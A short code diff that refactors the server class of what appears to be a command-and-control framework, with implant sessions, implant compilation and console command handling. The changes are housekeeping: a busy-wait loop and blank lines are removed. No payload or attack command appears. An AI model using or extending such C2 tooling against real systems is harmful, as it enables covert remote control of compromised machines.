@@ -3,7 +3,6 @@
 import logging
 import sys
 
-
 from mtls import mtls
 from generate.generate import generate
 from queue import Queue
@@ -40,9 +39,6 @@ class C2Server(object):
 
         threading.Thread(target=self._accept_client).start() #this is so we can listen and have execute commands from server console
 
-    def serverMain(self):
-        while self.shutdown == 0:
-            pass
 
     # Turn message into a protobuf Message and ssend to client
     def _send_client(self, message, client):
@@ -77,7 +73,6 @@ class C2Server(object):
 
         elif command[0] == "sessions":
             return str(self.implantlistener.sessions.list()).encode("ascii")
-
 
         # Compile an implant
         elif command[0] == "generate":
@@ -141,8 +136,7 @@ class C2Server(object):
                     break
 
 def main():
-    C2Server().serverMain()
-
+    C2Server()
 
 if __name__ == "__main__":
     main()
